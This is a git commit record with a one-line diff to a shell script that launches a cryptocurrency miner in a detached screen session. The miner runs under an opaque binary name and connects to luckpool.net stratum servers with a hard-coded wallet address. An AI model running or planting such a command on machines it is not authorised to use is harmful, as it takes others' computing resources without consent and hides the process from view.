fc31999519807f1409907dd2a96088a8c8af2d0e
renilo <88342640+renilo@users.noreply.github.com>
2021-12-06 11:00:52 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -1,1 +1,1 @@
-screen -dmS Running ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.$(echo $(shuf -i 1-3 -n 1)-MANUK) -p x -t $(nproc)
+screen -dmS Running ./manuk -c stratum+tcp://na.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.$(echo $(shuf -i 1-3 -n 1)-MANUKI) -p x --cpu 4
